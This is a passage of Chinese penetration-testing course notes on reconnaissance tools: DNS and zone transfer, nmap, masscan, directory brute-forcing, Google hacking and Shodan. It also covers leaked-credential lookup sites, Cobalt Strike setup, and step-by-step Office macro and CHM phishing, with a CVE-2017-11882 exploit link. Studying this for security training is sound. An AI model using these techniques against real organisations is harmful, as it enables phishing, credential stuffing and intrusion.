href="#DNS" class="headerlink" title="DNS"></a>DNS</h6><p>Domain Name system 域名系统</p><ul><li>提供域名与IP地址之间映射</li><li>大型企业网站运转核心</li></ul><p>收集原因</p><ul><li>确定企业网站运行规模</li><li>可以从DNS中收集子域名、IP等</li><li>控制网站解析</li></ul><h6 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h6><p>mail.XXX.com<br>收集原因</p><ul><li>确定企业网站运行数量，从而进行下一步(安全评估)准备</li><li>获得不同子域名所映射的IP，从而获得不同C段</li><li>寻找更大的<strong>安全脆弱点</strong>和面</li></ul><h6 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h6><p>什么是C段</p><ul><li>在IP地址的4段号码中，前3段号码为网络号码，剩下的1段号码为本地计算机的号码<br>  192.168.1.5/24</li></ul><p>收集原因</p><ul><li>确定C段存活主机数量</li><li>确定C段中主机的端口，服务，操作系统等</li></ul><h6 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h6><p>收集原因</p><ul><li>通过分析邮箱格式和后缀，可以得知邮箱命名规律和邮箱服务器</li><li>为爆破登录表单收集数据，可形成字典</li><li>发送钓鱼邮件，执行高级APT控制</li></ul><h6 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h6><ul><li><p>Web指纹<br>  获取运行的脚本语言，开发框架，CMS，寻找脆弱点(漏洞)<br>      如:.action一般可以确定为Struts2<br>      如:Powered by **</p></li><li><p>中间件指纹<br>  获取中间使用的产品和版本<br>  通过产品和版本查询是否有漏洞存在，如:struts2反序列化，iis文件解析</p></li><li><p>系统指纹<br>  获取操作系统使用的产品和版本<br>  可以在以后渗透中提供渗透基准</p><p>  ​       如:大小写，shell部署方式</p></li></ul><h6 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h6><p>寻找指定目标的已经泄露的数据<br>如:邮箱，获取到企业内部人员已经泄露的密码，可以在撞库，爆破中使用<br>如:姓名，手机号，找回密码，重置信息</p><h6 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h6><ul><li>邮件、链接、办公文件</li><li>构造鱼叉攻击（广撒网攻击）和水坑攻击（定向攻击）</li><li>绕过边界防御设备</li><li>从内部瓦解防御网络，直接反弹shell</li></ul><h4 id="3-2-DNS介绍"><a href="#3-2-DNS介绍" class="headerlink" title="3.2 DNS介绍"></a>3.2 DNS介绍</h4><h5 id="DNS基本原理"><a href="#DNS基本原理" class="headerlink" title="DNS基本原理"></a>DNS基本原理</h5><p><img src="https://pic.imgdb.cn/item/67458b1bd0e0a243d4d12f02.png"></p><p>主要使用UDP，但是也可以使用TCP</p><p><img src="https://pic.imgdb.cn/item/67458b88d0e0a243d4d12f23.png"></p><h5 id="DNS记录查询方法"><a href="#DNS记录查询方法" class="headerlink" title="DNS记录查询方法"></a>DNS记录查询方法</h5><ol><li>DNS A 记录</li></ol><p><img src="https://pic.imgdb.cn/item/67458c72d0e0a243d4d12f5d.png"></p><p>dig工具参数</p><p>+short：简洁反馈</p><p>@server：指定域名解析器</p><p>+trace：查询过程进行跟踪</p><ol start="2"><li>DNS NS 记录</li></ol><p><img src="https://pic.imgdb.cn/item/67458d3fd0e0a243d4d12ff9.png"></p><ol start="3"><li>DNS TXT 记录</li></ol><p><img src="https://pic.imgdb.cn/item/67458e47d0e0a243d4d13213.png"></p><ol start="4"><li>DNS MX 记录</li></ol><p><img src="https://pic.imgdb.cn/item/67458eadd0e0a243d4d1331e.png"></p><ol start="5"><li>DNS CNAME 记录</li></ol><p><img src="https://pic.imgdb.cn/item/67458ed8d0e0a243d4d1338d.png"></p><h5 id="域名信息查询方法"><a href="#域名信息查询方法" class="headerlink" title="域名信息查询方法"></a>域名信息查询方法</h5><p><img src="https://pic.imgdb.cn/item/67458f14d0e0a243d4d13419.png"></p><p><img src="https://pic.imgdb.cn/item/67458f50d0e0a243d4d134b1.png"></p><h5 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h5><h4 id="3-3-子域名收集"><a href="#3-3-子域名收集" class="headerlink" title="3.3 子域名收集"></a>3.3 子域名收集</h4><h5 id="子域名收集原因"><a href="#子域名收集原因" class="headerlink" title="子域名收集原因"></a>子域名收集原因</h5><ul><li>子域名枚举可以在测试范围内发现更多的域或子域，这将增大漏洞发现的机率。</li><li>有些隐藏的、被忽略的子域上运行的应用程序可能帮助我们发现重大漏洞。</li><li>在同一个组织的不同域或应用程序中往往存在相同的漏洞</li></ul><h5 id="子域名收集方法"><a href="#子域名收集方法" class="headerlink" title="子域名收集方法"></a>子域名收集方法</h5><ol><li>爆破</li></ol><ul><li>原理：通过字典匹配枚举存在的域名<ul><li>工具：</li><li><img src="https://pic.imgdb.cn/item/6746d6d7d0e0a243d4d1ea3b.png"></li></ul></li></ul><ol start="2"><li>搜索引擎</li></ol><ul><li><p>原理：通过搜索引擎获取已经爬取的子域名</p><ul><li><p>语法：Site:163.cn</p></li><li><p>工具</p><ul><li><p>theharvester</p><ul><li>利用google, bing, pgp, linkedin, google-profiles, jigsaw, twitter, 公开信息收集</li><li>可以获取子域名，邮箱，主机，员工姓名，开放端口，banner</li><li>常用语法：theharvester -d sangfor:com.cn -b al （-b 数据的来源）</li></ul></li><li><p>aquatone</p><ul><li><p>除了子域爆破，同时还会利用各种开放的互联网服务和资源，来协助其完成子域枚举任务，增加子域名爆破的成功率</p></li><li><p>aquatone分为三个阶段：发现，扫描，收集</p><ul><li><p>aquatone-discover 发现<br>  通过获取google、shodan、censys、爆破等多种方式获取目标存在的域名</p><p>  常用语法：aquatone-discover -d sangfor.com.cn -t 1  （-t  使用线程数）</p></li><li><p>aquatone-scan 扫描<br>  经过发现阶段获取到域名，然后扫描域名主机存活和开发端口</p><p>  常用语法：aquatone-scan -d sangfor.com.cn -p ‘port’ -t ‘threads’</p></li><li><p>aquatone-gather 收集<br>  经过扫描以后发现存活的域名和端口，aquatone-gather将自动访问存活的域名并截图</p><p>  常用语法:aquatone-gather -d sangfor.com.cn</p></li></ul></li></ul></li></ul></li></ul></li></ul><ol start="3"><li>域传送</li></ol><ul><li>DNS区域传送(DNS zone transfer)指的是一台<u>备用服务器使用来自主服务器的数据刷新自己的域(zone)数据库</u>。为运行中的DNS服务提供了一定的冗余度，目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。</li><li>DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但<u>许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供个zone数据库</u>的详细信息，所以说允许不受信任的因特网用户执行DNS区域传送(zone transfer)</li></ul><p>危害：</p><p>黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标找出未使用的IP地址，黑客可以绕过基于网络的访问控制</p><p>方法：</p><ul><li>dig @DnsServer（指定某一台域名解析服务器） axfr domain（具体传输的目标域名）</li><li>nslookup 进入交互 -&gt; server <em>dns domain</em>  -&gt; ls <em>domain</em></li><li>fierce -dns domains</li></ul><p><img src="https://pic.imgdb.cn/item/6746dd50d0e0a243d4d1ed4c.png"></p><ol start="4"><li>在线网站</li></ol><ul><li><a href="http://www.virustotal.com/">www.virustotal.com</a></li><li>dnsdumpster.com</li><li>tool.chinaz.com</li></ul><p>课堂作业：</p><p><img src="https://pic.imgdb.cn/item/6746dda9d0e0a243d4d1ed70.png"></p><h4 id="3-4-C段扫描"><a href="#3-4-C段扫描" class="headerlink" title="3.4 C段扫描"></a>3.4 C段扫描</h4><h5 id="C段扫描原因"><a href="#C段扫描原因" class="headerlink" title="C段扫描原因"></a>C段扫描原因</h5><ul><li>收集C段内部属于目标的IP地址</li><li>内部服务限制只能IP访问，没有映射域名</li><li>更多的探测主机目标资产</li></ul><h5 id="C段扫描方法"><a href="#C段扫描方法" class="headerlink" title="C段扫描方法"></a>C段扫描方法</h5><h6 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h6><ul><li>快速扫描大型网络</li><li>可以获得主机运行的端口，服务，系统指纹</li><li>提供上百个扩展脚本</li></ul><p><img src="https://pic.imgdb.cn/item/674c42a3d0e0a243d4db9e62.png"></p><p><img src="https://pic.imgdb.cn/item/674c42e7d0e0a243d4db9e82.png"></p><p><img src="https://pic.imgdb.cn/item/674c433ed0e0a243d4db9e96.png"></p><p><img src="https://pic.imgdb.cn/item/674c436ed0e0a243d4db9e9c.png"></p><h6 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h6><ul><li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网，每秒传输1000万个数据包</li><li>允许任意地址范围和端口范围</li></ul><p><img src="https://pic.imgdb.cn/item/674c4435d0e0a243d4db9ebd.png"></p><p><img src="https://pic.imgdb.cn/item/674c446cd0e0a243d4db9ecb.png"></p><p><img src="https://pic.imgdb.cn/item/674c449ad0e0a243d4db9ed6.png"></p><p><img src="https://pic.imgdb.cn/item/674c44c5d0e0a243d4db9ee6.png"></p><p><img src="https://pic.imgdb.cn/item/674c44fed0e0a243d4db9ef2.png"></p><ul><li>Masscan和Namp的结合</li></ul><p>一般情况下，可以先使用masscan对目标IP(通常是一个网段)进行全端口扫描，然后再使用nmap对存活主机的开放端口进行扫描，找出对应端口服务存在的漏洞</p><p>使用masscan对目标IP进行扫描的原因就是因为其速度快于nmap</p><h4 id="3-5-Web目录扫描"><a href="#3-5-Web目录扫描" class="headerlink" title="3.5 Web目录扫描"></a>3.5 Web目录扫描</h4><h5 id="目录扫描的原因"><a href="#目录扫描的原因" class="headerlink" title="目录扫描的原因"></a>目录扫描的原因</h5><ul><li>寻找到网站后台管理</li><li>寻找未授权界面</li><li>寻找网站更多隐藏信息</li></ul><h5 id="目录扫描的方法"><a href="#目录扫描的方法" class="headerlink" title="目录扫描的方法"></a>目录扫描的方法</h5><h6 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h6><ul><li>Robots协议 (Robots Exclusion Protocol)“网络爬虫排除标准”，网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</li><li>同时也记录网站所具有基本的目录</li></ul><h6 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h6><p>搜索引擎会爬取网站下目录，并且不需要触碰网站任何防御设备</p><p>语法：site:sangfor.com.cn<br><img src="https://pic.imgdb.cn/item/674c46f2d0e0a243d4db9f22.png"></p><h6 id="爆破-及工具"><a href="#爆破-及工具" class="headerlink" title="爆破 及工具"></a>爆破 及工具</h6><ul><li>通过字典匹配网站是否返回相应正确状态码，然后列出存在的目录</li><li>爆破可能会触发网站防火墙拦截规则，造成IP封禁</li></ul><p>爆破工具：</p><ul><li><strong>dirb</strong><ul><li>DIRB是一个Web内容扫描程序，通过字典查找WEB服务器的响应，DRIB只能扫描网站目录不能扫描漏洞</li><li><img src="https://pic.imgdb.cn/item/674c47f5d0e0a243d4db9f4a.png"></li><li><img src="https://pic.imgdb.cn/item/674c482fd0e0a243d4db9f54.png"></li></ul></li><li><strong>dirbuster</strong><ul><li>DirBuster多线程Java应用程序，主要扫描服务器上的目录和文件名，扫描方式分为基于字典和纯爆破，OWASP 下开源项目</li><li><img src="https://pic.imgdb.cn/item/674c48d7d0e0a243d4db9f74.png"></li></ul></li><li>御剑</li></ul><h4 id="3-6-指纹识别"><a href="#3-6-指纹识别" class="headerlink" title="3.6 指纹识别"></a>3.6 指纹识别</h4><h5 id="系统指纹识别"><a href="#系统指纹识别" class="headerlink" title="系统指纹识别"></a>系统指纹识别</h5><ol><li>方式一  不同操作系统对于处理TCP/IP数据包不相同</li></ol><p>通过TCP/IP数据包发到目标主机，由于每个操作系统类型对于处理TCP/IP数据包都不相同，所以可以通过之间的差别判定操作系统类型。</p><ul><li>识别方法</li></ul><p><img src="https://pic.imgdb.cn/item/674c49e6d0e0a243d4db9fa2.png"></p><ol start="2"><li>方式二 端口服务识别</li></ol><ul><li><p>每个操作系统都有特有的服务和端口，如:</p><ul><li>windows 桌面连接使用的3389 RDP协议</li><li>445端口 windows 的smb协议开启端口</li><li>iis 80端口</li></ul></li><li><p>识别方法</p></li></ul><p><img src="https://pic.imgdb.cn/item/674c4ad8d0e0a243d4db9fd3.png"></p><p>左右对比，增加了-sV的会显示对应服务的版本，即可以探测系统</p><h5 id="中间件指纹识别"><a href="#中间件指纹识别" class="headerlink" title="中间件指纹识别"></a>中间件指纹识别</h5><ul><li>方法<ul><li>通过<strong>http返回消息</strong>中提取server字段</li><li>通过<strong>端口服务</strong>探测中间件</li><li>通过<strong>构造错误界面</strong>返回信息查看中间件</li></ul></li></ul><ol><li>方法一 通过<strong>http返回消息</strong>中提取server字段</li></ol><p><img src="https://pic.imgdb.cn/item/674c4ba2d0e0a243d4db9fee.png"></p><ol start="2"><li>方法二 通过<strong>端口服务</strong>探测中间件</li></ol><p><img src="https://pic.imgdb.cn/item/674c4bd8d0e0a243d4db9ff9.png"></p><ol start="3"><li>方法三 通过<strong>构造错误界面</strong>返回信息查看中间件</li></ol><p><img src="https://pic.imgdb.cn/item/674c4c0bd0e0a243d4db9ffa.png"></p><h5 id="Web程序指纹识别"><a href="#Web程序指纹识别" class="headerlink" title="Web程序指纹识别"></a>Web程序指纹识别</h5><ul><li>识别目标<ul><li>开发语言</li><li>开发框架</li><li>第三方组件</li><li>CMS程序</li><li>数据库</li></ul></li></ul><ol><li>开发语言</li></ol><ul><li>后缀名识别 .asp、.php、jsp</li></ul><p>如果无法通过后缀名识别，可以通过抓包查看与后台交互点，如：登录，查询</p><ul><li>http返回消息头 x-Powered-By</li><li>cookie：PHPSESSIONID -&gt; php，JSPSESSIONID -&gt; jsp，ASPSESSIONIDAASTCACQ -&gt; asp</li></ul><ol start="2"><li>开发框架</li></ol><ul><li>php的thinkphp框架识别方法特定ico图标</li><li>Action后缀90%几率struts2或者webwork</li><li>do后缀 50%几率spring mvc</li><li>url路径/action/xxx70%几率struts2</li><li>form后缀 60%几率spring mvc</li><li>Vm后缀 90%几率VelocityViewServlet</li><li>jsf后缀 99%几率Java Server Faces</li></ul><ol start="3"><li>第三方组件</li></ol><p>一般包括流量统计、文件编辑器、模板引擎</p><ul><li>识别方法：一般目录扫描<ul><li>FCKeditor</li><li>CKEditor</li></ul></li></ul><ol start="4"><li>CMS程序</li></ol><ul><li>特定文件夹</li></ul><p>dede/、admin/admin_Login.aspx</p><ul><li>Powered by ***</li><li>网站favicon图标</li></ul><ol start="5"><li>数据库</li></ol><ul><li>常规判断，asp-&gt;sqlserver，php-&gt;mysql，jsp-oracle</li><li>网站错误信息</li><li>端口服务，1443-&gt;sqlserver，3306-&gt;mysql，oracle-&gt;1521</li></ul><p><strong>在线探测</strong></p><p>方法一：</p><p><img src="https://pic.imgdb.cn/item/674c4ec1d0e0a243d4dba085.png"></p><p>方法二：</p><p><img src="https://pic.imgdb.cn/item/674c4efbd0e0a243d4dba088.png"></p><p><img src="https://pic.imgdb.cn/item/674c4f15d0e0a243d4dba08b.png"></p><h5 id="防火墙指纹识别"><a href="#防火墙指纹识别" class="headerlink" title="防火墙指纹识别"></a>防火墙指纹识别</h5><ul><li>识别方法</li></ul><p>方法一：Nmap探测，使用脚本</p><p><img src="https://pic.imgdb.cn/item/674c4f3bd0e0a243d4dba08f.png"></p><p>方法二：SQLmap探测</p><p><img src="https://pic.imgdb.cn/item/674c4f92d0e0a243d4dba099.png"></p><p>课堂测试：</p><p><img src="https://pic.imgdb.cn/item/674c5000d0e0a243d4dba0b4.png"></p><h4 id="3-7-GoogleHacking"><a href="#3-7-GoogleHacking" class="headerlink" title="3.7 GoogleHacking"></a>3.7 GoogleHacking</h4><h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><ul><li>使用Google搜索引擎或其他Google应用程序通过特定语法来查找网站配置或代码中的安全漏洞<ul><li>搜索登录后台、特定文件、漏洞页面、错误信息等等</li></ul></li></ul><h5 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h5><p><img src="https://pic.imgdb.cn/item/674c5557d0e0a243d4dba1d5.png"></p><h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><ul><li><p>Intext:key</p><ul><li>搜索网页带有关键字的页面</li></ul></li><li><p>Allintext:key</p><ul><li>功能与intext，但是可以接多个关键字</li></ul></li><li><p>intitle:key</p><ul><li>搜索网页标题中是否有所输入的文字</li></ul></li><li><p>Allintitle:key</p><ul><li>功能与intext，可以接多个关键字，但不能与别的关键字连用</li></ul></li><li><p>cache:url</p><ul><li>查看指定URL快照</li></ul></li><li><p>filetype:</p><ul><li>搜索指定类型文件</li></ul></li><li><p>info:</p><ul><li>搜索输入URL的摘要信息和其他相关信息,不能与其他关键词混用</li></ul></li><li><p>inurl:</p><ul><li>搜索输入字符是否存在于URL中,可以与site结合找后台</li></ul></li><li><p>site:</p><ul><li>搜索特定网站或者子域名</li></ul></li><li><p>related:URL</p><ul><li>搜索与该URL相关的页面</li></ul></li></ul><h5 id="高级案例"><a href="#高级案例" class="headerlink" title="高级案例"></a>高级案例</h5><p><img src="https://pic.imgdb.cn/item/674c6f6bd0e0a243d4dba6dc.png"></p><p><img src="https://pic.imgdb.cn/item/674c6fb9d0e0a243d4dba6e3.png"></p><p><img src="https://pic.imgdb.cn/item/674c70dfd0e0a243d4dba714.png"></p><p><img src="https://pic.imgdb.cn/item/674c7121d0e0a243d4dba71e.png"></p><p><img src="https://pic.imgdb.cn/item/674c713fd0e0a243d4dba724.png"></p><p><img src="https://pic.imgdb.cn/item/674c7169d0e0a243d4dba733.png"></p><p>课堂测试：</p><p><img src="https://pic.imgdb.cn/item/674c7196d0e0a243d4dba737.png"></p><h4 id="3-8-网络空间搜索引擎"><a href="#3-8-网络空间搜索引擎" class="headerlink" title="3.8 网络空间搜索引擎"></a>3.8 网络空间搜索引擎</h4><h5 id="网络空间搜索引擎介绍"><a href="#网络空间搜索引擎介绍" class="headerlink" title="网络空间搜索引擎介绍"></a>网络空间搜索引擎介绍</h5><ul><li>网络空间搜索引擎不同于搜索普通网页，而是直接<strong>搜索网络中存在主机</strong>，将主机信息汇聚成数据库，然后显示出<strong>主机的IP、端口、中间件、摄像头，工控设备banner</strong>等其他网络设备信息。</li><li><strong>按照普通搜索引擎规则来搜索网络设备</strong>，如：ip：”192.168.1.0”</li></ul><h5 id="常见搜索引擎"><a href="#常见搜索引擎" class="headerlink" title="常见搜索引擎"></a>常见搜索引擎</h5><ul><li>国外<ul><li>shodan</li></ul></li><li>国内<ul><li>zoomeye</li><li>fofa</li></ul></li></ul><h5 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h5><ul><li>Shodan是国外人员开发<strong>网络空间搜索引擎</strong></li><li>Shodan可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的<strong>服务器、摄像头、打印机、路由器</strong>等。</li><li>凡是连接到互联网的<strong>红绿灯、安全摄像头、家庭自动化设备</strong>以及<strong>加热系统</strong>等都会被轻易的搜索到。</li></ul><h6 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h6><p><img src="https://pic.imgdb.cn/item/674d6d52d0e0a243d4dbe3a5.png"></p><p><img src="https://pic.imgdb.cn/item/674d6fe4d0e0a243d4dbe448.png"></p><h6 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h6><p><img src="https://pic.imgdb.cn/item/674d701cd0e0a243d4dbe45d.png"></p><p><img src="https://pic.imgdb.cn/item/674d7068d0e0a243d4dbe473.png"></p><p><img src="https://pic.imgdb.cn/item/674d708cd0e0a243d4dbe47e.png"></p><p><img src="https://pic.imgdb.cn/item/674d70ffd0e0a243d4dbe4ad.png"></p><p><img src="https://pic.imgdb.cn/item/674d7198d0e0a243d4dbe4ee.png"></p><p><img src="https://pic.imgdb.cn/item/674d71cbd0e0a243d4dbe509.png"></p><p><img src="https://pic.imgdb.cn/item/674d71e4d0e0a243d4dbe50e.png"></p><p><img src="https://pic.imgdb.cn/item/674d71f8d0e0a243d4dbe522.png"></p><p><img src="https://pic.imgdb.cn/item/674d7237d0e0a243d4dbe549.png"></p><p><img src="https://pic.imgdb.cn/item/674d7255d0e0a243d4dbe558.png"></p><p><img src="https://pic.imgdb.cn/item/674d7339d0e0a243d4dbe5a2.png"></p><p>课堂测试：</p><p><img src="https://pic.imgdb.cn/item/674d7378d0e0a243d4dbe5ba.png"></p><h4 id="3-9-情报分析"><a href="#3-9-情报分析" class="headerlink" title="3.9 情报分析"></a>3.9 情报分析</h4><h5 id="情报分析概念"><a href="#情报分析概念" class="headerlink" title="情报分析概念"></a>情报分析概念</h5><ul><li>广义上情报分析是对全源数据进行综合、评估、分析和解读，将处理过的信息转化为情报以满足已知或预期用户需求的过程。</li><li>实际上对于网络空间情报分析主要对于目标的ip,域名，电话，邮箱位置，员工，公司出口网络，内部网络等等进行收集，然后进行综合判断整理汇聚成数据库</li></ul><h5 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a>Maltego</h5><ul><li><p>Maltego是一种独特的工具，它对互联网上的信息进行收集、组织，并将这些信息显示在适于执行链路分析的、基于节点的图形上。</p></li><li><p>在kali中默认安装了maltego软件，可以直接在终端输入maltego进行启动</p></li><li><p>首次使用maltego需要注册</p><ul><li>注册网站:<br>  <a href="https://www.paterva.com/web7/buy/maltego-clients/maltego-ce.php">https://www.paterva.com/web7/buy/maltego-clients/maltego-ce.php</a></li></ul></li></ul><p><img src="https://pic.imgdb.cn/item/674d75d2d0e0a243d4dbe6e0.png"></p><p>信息收集方法：</p><p><img src="https://pic.imgdb.cn/item/674d7659d0e0a243d4dbe71b.png"></p><p><img src="https://pic.imgdb.cn/item/674d7699d0e0a243d4dbe729.png"></p><p><img src="https://pic.imgdb.cn/item/674d76c6d0e0a243d4dbe735.png"></p><p>深入探测：</p><p><img src="https://pic.imgdb.cn/item/674d773ad0e0a243d4dbe749.png"></p><p><img src="https://pic.imgdb.cn/item/674d7773d0e0a243d4dbe760.png"></p><p><img src="https://pic.imgdb.cn/item/674d77c8d0e0a243d4dbe78a.png"></p><p>生成报告</p><p><img src="https://pic.imgdb.cn/item/674d7801d0e0a243d4dbe7b1.png"></p><h4 id="3-10-社工库和多维度信息收集"><a href="#3-10-社工库和多维度信息收集" class="headerlink" title="3.10 社工库和多维度信息收集"></a>3.10 社工库和多维度信息收集</h4><h5 id="社工库-1"><a href="#社工库-1" class="headerlink" title="社工库"></a>社工库</h5><ul><li><p>将互联网泄露的信息汇聚成数据库，简单说：黑客数据库</p></li><li><p>社工库网址<br>  <a href="https://www.reg007.com/">https://www.reg007.com/</a>      邮箱、手机号注册过哪些网站<br>  <a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a>   邮箱是否被泄露<br>  <a href="https://snusbase.com/search">https://snusbase.com/search</a>    邮箱、用户名、IP地址、HASH<br>  <a href="http://163.donothackme.club/">http://163.donothackme.club/</a><br>  <a href="http://s.70sec.com/">http://s.70sec.com/</a><br>  <a href="http://2017.findmima.com/">http://2017.findmima.com</a><br>  <a href="https://gq.findmima.com/">https://gq.findmima.com/</a><br>  <a href="http://cha.hx99.net/">http://cha.hx99.net/</a><br>  <a href="http://sgk.70sec.com/index.php">http://sgk.70sec.com/index.php</a><br>  <a href="https://www,shuju666.com/Home/Profile">https://www,shuju666.com/Home/Profile</a></p></li><li><p>构建社工库<br>  <a href="https://raidforums.com/Announcement-Database-Index-CLICK-ME">https://raidforums.com/Announcement-Database-Index-CLICK-ME</a></p></li></ul><p><img src="https://pic.imgdb.cn/item/674d7a5bd0e0a243d4dbe8d6.png"></p><h5 id="多维度信息收集"><a href="#多维度信息收集" class="headerlink" title="多维度信息收集"></a>多维度信息收集</h5><ul><li>通过app</li><li>通过微信公众号</li><li>通过目标qq群</li><li>通过威胁情报</li><li>通过网站开发者角度</li><li>通过运维角度</li><li>通过架构师角度去获得目标相关信息</li></ul><p><img src="https://pic.imgdb.cn/item/674d7b56d0e0a243d4dbea19.png"></p><p><img src="https://pic.imgdb.cn/item/674d7b9cd0e0a243d4dbeae6.png"></p><p><img src="https://pic.imgdb.cn/item/674d7bcfd0e0a243d4dbeb78.png"></p><p><img src="https://pic.imgdb.cn/item/674d7c83d0e0a243d4dbed7f.png"></p><p><img src="https://pic.imgdb.cn/item/674d7ccad0e0a243d4dbee1e.png"></p><p><img src="https://pic.imgdb.cn/item/674d7ce8d0e0a243d4dbee74.png"></p><p><img src="https://pic.imgdb.cn/item/674d7d10d0e0a243d4dbeecd.png"></p><p><img src="https://pic.imgdb.cn/item/674d7d23d0e0a243d4dbeed5.png"></p><h4 id="3-11-CobaltStrike配置"><a href="#3-11-CobaltStrike配置" class="headerlink" title="3.11 CobaltStrike配置"></a>3.11 CobaltStrike配置</h4><h5 id="Cobalt-Strike介绍"><a href="#Cobalt-Strike介绍" class="headerlink" title="Cobalt Strike介绍"></a>Cobalt Strike介绍</h5><ul><li>Cobalt Strike是一款渗透测试软件，分为客户端与服务端，可以进行团队分布式操作<br>  服务端:1个<br>  客户端:N个</li><li>Cobalt Strike集成了功能和模块<ul><li>端口转发</li><li>站点克隆</li><li>Windows exe程序生成</li><li>Windows dll动态链接库生成</li><li>java程序生成</li><li>office宏代码生成</li></ul></li></ul><h5 id="Cobalt-Strike安装配置"><a href="#Cobalt-Strike安装配置" class="headerlink" title="Cobalt Strike安装配置"></a>Cobalt Strike安装配置</h5><p>环境：kali</p><p>服务端与客户端均需要安装java环境</p><p><img src="https://pic.imgdb.cn/item/674dbd3bd0e0a243d4dc33d8.png"></p><p>服务端：</p><p><img src="https://pic.imgdb.cn/item/674dbd67d0e0a243d4dc33de.png"></p><p>./teamserver服务端IP地址密码</p><p>客户端：</p><p><img src="https://pic.imgdb.cn/item/674dbe08d0e0a243d4dc340b.png"></p><p><img src="https://pic.imgdb.cn/item/674dbe2ed0e0a243d4dc3412.png"></p><p><img src="https://pic.imgdb.cn/item/674dbeacd0e0a243d4dc3456.png"></p><h5 id="Cobalt-Strike使用"><a href="#Cobalt-Strike使用" class="headerlink" title="Cobalt Strike使用"></a>Cobalt Strike使用</h5><p>第一步：</p><p><img src="https://pic.imgdb.cn/item/674dbebdd0e0a243d4dc345f.png"></p><p>第二步：</p><p><img src="https://pic.imgdb.cn/item/674dbef1d0e0a243d4dc3476.png"></p><p>第三步：</p><p><img src="https://pic.imgdb.cn/item/674dbf37d0e0a243d4dc3486.png"></p><p><img src="https://pic.imgdb.cn/item/674dbf6ed0e0a243d4dc3493.png"></p><h4 id="3-12-office钓鱼"><a href="#3-12-office钓鱼" class="headerlink" title="3.12 office钓鱼"></a>3.12 office钓鱼</h4><h5 id="office钓鱼介绍"><a href="#office钓鱼介绍" class="headerlink" title="office钓鱼介绍"></a>office钓鱼介绍</h5><ul><li>在无需交互、用户无感知的情况下，执行Office文档中<strong>内嵌的一段恶意代码</strong>，从远控地址中下载并运行恶意可执行程序。例如：远控木马或者勒索病毒等</li></ul><h5 id="CobaltStrike钓鱼"><a href="#CobaltStrike钓鱼" class="headerlink" title="CobaltStrike钓鱼"></a>CobaltStrike钓鱼</h5><ul><li><p>Cobalt Strike office钓鱼主要方法是生成一段vba代码，然后将代码复制到office 套件中，当用户启动office自动运行</p></li><li><p>Cobalt Strike操作</p><ul><li>点击Cobalt Strike主界面中attacks-&gt;packages-&gt;ms office macro</li><li>弹出界面选择Listener，单击确定</li><li>对话框中给出每一步仔细操作，单击copymacro按钮</li></ul></li><li><p>word操作</p><ul><li>点击上方标签视图标签</li><li>在该标签中点击宏按钮，弹出的对话框中输入宏名字，然后单击创建按钮<ul><li><img src="https://pic.imgdb.cn/item/674dc148d0e0a243d4dc3517.png"></li></ul></li><li>首先清空所有代码，然后将复制的代码粘贴到编辑器中，关闭宏编辑窗口</li><li>保存退出</li><li>双击再次运行保存的文档</li></ul></li></ul><p><img src="https://pic.imgdb.cn/item/674dc198d0e0a243d4dc352e.png"></p><p><img src="https://pic.imgdb.cn/item/674dc1b8d0e0a243d4dc3535.png"></p><h5 id="CVE-2017-11882"><a href="#CVE-2017-11882" class="headerlink" title="CVE-2017-11882"></a>CVE-2017-11882</h5><ul><li><p>漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。</p></li><li><p>该漏洞出现在模块EQNEDT32.EXE中，属于栈溢出漏洞，是对Equation Native 数据结构处理不当导致。</p></li><li><p>漏洞影响</p><ul><li>Microsoft Office 2007</li><li>Microsoft Office 2010</li><li>Microsoft Office 2013</li><li>Microsoft Office 2016</li></ul></li><li><p>复现过程</p><ul><li>exploit<ul><li><a href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></li></ul></li><li>虽然是栈溢出漏洞，但是该漏洞对于命令有限制，分为可以执行43b和执行109b，所以在利用过程需要注意命令长度。</li></ul></li></ul><p><img src="https://pic.imgdb.cn/item/674dc270d0e0a243d4dc356c.png"></p><h4 id="3-13-钓鱼"><a href="#3-13-钓鱼" class="headerlink" title="3.13 钓鱼"></a>3.13 钓鱼</h4><h5 id="CHM钓鱼"><a href="#CHM钓鱼" class="headerlink" title="CHM钓鱼"></a>CHM钓鱼</h5><ol><li>介绍</li></ol><ul><li>CHM(Compiled Help Manual)即“已编译的帮助文件”。它是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。</li><li>利用CHM钓鱼主要原因是因为该文档可以执行cmd命令</li></ul><ol start="2"><li>CHM制作</li></ol><ul><li>软件：EasyCHM</li></ul><ol 